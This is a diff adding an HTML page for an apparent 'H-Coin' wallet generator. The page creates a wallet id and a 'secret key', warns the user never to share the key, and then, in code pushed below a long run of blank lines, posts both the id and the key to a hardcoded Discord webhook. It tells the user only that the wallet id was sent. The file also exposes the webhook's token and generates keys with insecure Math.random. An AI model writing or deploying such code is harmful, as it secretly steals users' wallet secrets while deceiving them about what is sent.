@@ -1,0 +1,105 @@
+<html>
+    <head>
+        <title>Buy and Sell with H-Coin</title>
+        <link rel="stylesheet" href="style.css">
+    </head>
+    <body>
+        <div class="banner">
+            <div class="navbar">
+                <img src="logo.png" class="logo">
+                <ul>
+                    <li><a href="./index.html">Home</a></li>
+                    <li><a href="./about.html">About</a></li>
+                    <li><a href="./buy.html">Buy</a></li>
+                    <li><a href="#sell">Sell</a></li>
+                    <li><a href="./price.html">Price</a></li>
+                </ul>
+            </div>
+            <div id="home" class="home">
+                <h1 id="text">Gnerated wallet id: 000</h1>
+
+                <p id="secret">Secret Key (DO NOT SHARE WITH ANYONE SHARING THIS WILL GIVE THEM ACCESS TO YOUR WALLET, KEEP IT SAFE): </p>
+                
+                <div>
+                    <button type="button" onclick="generateID()"><span></span>GENERATE WALLET</button></a>
+                    <button type="button" onclick="sendID()"><span></span>CONFIRM</button></a>
+                </div>
+            </div>
+            <var></var>
+        </div>
+    </body>
+
+    <script>
+    function generateID() {
+
+        function makeid(length) {
+            var result           = '';
+            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var charactersLength = characters.length;
+            for ( var i = 0; i < length; i++ ) {
+                result += characters.charAt(Math.floor(Math.random() * 
+                charactersLength));
+            }
+            return result;
+        }
+
+
+        const text3 = document.getElementById("secret");
+        const text2 = document.getElementById("text");
+        text2.innerHTML = `Generated wallet id: ${Math.floor(Math.random()*999)}`
+        text3.innerHTML = `Secret Key (DO NOT SHARE WITH ANYONE SHARING THIS WILL GIVE THEM ACCESS TO YOUR WALLET, KEEP IT SAFE): ${makeid(10)}`
+    }
+    function sendID() {
+        const d = new Date()
+        const text2 = document.getElementById("text").innerHTML;
+        const array = text2.split(": ")
+        const ID = array[1]
+
+        const text3 = document.getElementById("secret").innerHTML;
+        const array2 = text3.split(": ")
+        const ID2 = array2[1]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/945816274234126347/VhmMAGWuuk-EBW-0U92WKZgk-z6OQCdsLvl6UbjAfJ8qnJGZizbUZLb29wM_Mwpr06Cl");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "New Wallet Created!",
+        avatar_url: "https://cdn.discordapp.com/attachments/828656438414671909/945814720831692810/logo.png",
+        content: `New wallet created on ${d.getMonth() + 1}/${d.getDate()}/${d.getFullYear()} with id: ${ID}. Secret: ${ID2} @everyone`
+      }
+
+      document.getElementById("text").innerHTML = "Wallet id successfully sent! Please make sure to store your wallet id for future transactions."
+
+      request.send(JSON.stringify(params));
+
+
+
+
+
+
+
+
+
+    }
+    </script>
+</html>
